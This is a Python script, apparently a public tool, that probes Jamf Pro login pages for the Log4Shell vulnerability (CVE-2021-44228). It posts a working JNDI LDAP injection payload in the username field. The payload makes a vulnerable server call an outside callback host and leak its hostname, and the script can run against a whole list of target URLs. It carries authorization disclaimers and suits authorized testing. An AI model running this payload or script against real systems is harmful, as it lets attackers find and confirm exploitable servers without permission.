#!/usr/bin/env python3
"""
Jamf Pro Log4Shell Vulnerability Scanner

This tool tests Jamf Pro installations for the Log4Shell (CVE-2021-44228) vulnerability
by sending JNDI LDAP payloads and checking for callbacks.

Author: @Random-Robbie
License: Use only for authorized security testing

DISCLAIMER: This tool is for authorized security testing only. Ensure you have
explicit permission before testing any systems.
"""

import argparse
import os
import sys
from random import randint
from typing import Optional

import requests
import urllib3

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JamfLog4jScanner:
    """Scanner for detecting Log4Shell vulnerability in Jamf Pro installations."""

    def __init__(self, collab_url: str, proxy: Optional[str] = None):
        """
        Initialize the scanner.

        Args:
            collab_url: Collaborator/callback URL for out-of-band detection
            proxy: Optional proxy URL for debugging
        """
        self.collab_url = collab_url
        self.session = requests.Session()

        if proxy:
            os.environ['HTTP_PROXY'] = proxy
            os.environ['HTTPS_PROXY'] = proxy

    def test_url(self, url: str) -> None:
        """
        Test a single URL for Log4Shell vulnerability.

        Args:
            url: Target URL to test
        """
        # Generate unique identifier for this test
        test_id = randint(1, 99999)

        # Craft the JNDI LDAP payload with hostname exfiltration
        payload = f"${{jndi:ldap://h${{hostName}}.{test_id}.{self.collab_url}/test}}"

        # POST parameters with payload in username field
        params_post = {
            "password": "",
            "username": payload
        }

        # HTTP headers mimicking a legitimate browser request
        headers = {
            "Origin": url,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Referer": url,
            "Connection": "close",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Site": "same-origin",
            "Accept-Encoding": "gzip, deflate",
            "Sec-Fetch-Mode": "navigate",
            "Te": "trailers",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-User": "?1",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            response = self.session.post(
                url,
                data=params_post,
                headers=headers,
                verify=False,
                timeout=10
            )
            print(f"[*] Request sent to {url}")
            print(f"[*] Test ID: {test_id}")
            print(f"[!] Check your collaborator for DNS callback: h[hostname].{test_id}.{self.collab_url}")
            print(f"[*] Response Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing {url}: {e}")

    def scan_from_file(self, file_path: str) -> None:
        """
        Scan multiple URLs from a file.

        Args:
            file_path: Path to file containing URLs (one per line)
        """
        if not os.path.exists(file_path):
            print(f"[!] Error: File '{file_path}' not found")
            return

        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]

        print(f"[*] Loaded {len(urls)} URLs from {file_path}")

        for idx, url in enumerate(urls, 1):
            try:
                print(f"\n[*] Testing {idx}/{len(urls)}: {url}")
                self.test_url(url)
            except KeyboardInterrupt:
                print("\n[!] Scan interrupted by user")
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error processing {url}: {e}")


def main():
    """Main entry point for the scanner."""
    parser = argparse.ArgumentParser(
        description='Jamf Pro Log4Shell (CVE-2021-44228) Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test a single URL
  python jamf.py -u https://jamf.example.com -c your-collab-id.oastify.com

  # Test multiple URLs from a file
  python jamf.py -f urls.txt -c your-collab-id.oastify.com

  # Use with debugging proxy
  python jamf.py -u https://jamf.example.com -c your-collab-id.oastify.com -p http://127.0.0.1:8080

Note: Ensure you have authorization before testing any systems.
        """
    )

    parser.add_argument(
        "-u", "--url",
        default="http://localhost",
        help="Single URL to test (default: http://localhost)"
    )
    parser.add_argument(
        "-f", "--file",
        default="",
        help="File containing URLs to test (one per line)"
    )
    parser.add_argument(
        "-c", "--collab",
        required=True,
        help="Collaborator/callback URL for out-of-band detection (e.g., burpcollaborator.net or interact.sh)"
    )
    parser.add_argument(
        "-p", "--proxy",
        default="",
        help="Proxy URL for debugging (e.g., http://127.0.0.1:8080)"
    )

    args = parser.parse_args()

    # Print banner
    print("=" * 70)
    print("Jamf Pro Log4Shell Vulnerability Scanner")
    print("Author: @Random-Robbie")
    print("Target: CVE-2021-44228 (Log4Shell)")
    print("=" * 70)
    print()

    # Initialize scanner
    scanner = JamfLog4jScanner(args.collab, args.proxy)

    # Run scan
    if args.file:
        scanner.scan_from_file(args.file)
    else:
        print(f"[*] Testing single URL: {args.url}")
        print(f"[*] Collaborator URL: {args.collab}")
        print()
        scanner.test_url(args.url)

    print("\n" + "=" * 70)
    print("[*] Scan complete!")
    print("[!] Check your collaborator for any callbacks")
    print("=" * 70)


if __name__ == "__main__":
    main()
